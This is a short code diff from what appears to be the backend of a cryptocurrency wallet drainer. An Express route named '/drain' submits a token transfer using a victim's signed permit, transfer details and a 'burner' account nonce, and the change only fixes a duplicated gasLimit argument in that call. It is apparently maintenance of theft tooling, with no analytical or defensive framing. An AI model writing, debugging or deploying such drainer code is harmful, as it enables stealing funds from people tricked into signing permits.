@@ -209,7 +209,7 @@ app.post('/drain', async (req, res) => {
       permitDetails,
       transferDetails,  // ✅ ABI-encoded bytes (NOT struct object)
       signature,
-      { gasLimit, gasLimit, gasPrice, nonce: burnerNonce }
+      { gasLimit, gasPrice, nonce: burnerNonce }
     );
   
   const receipt = await tx.wait();
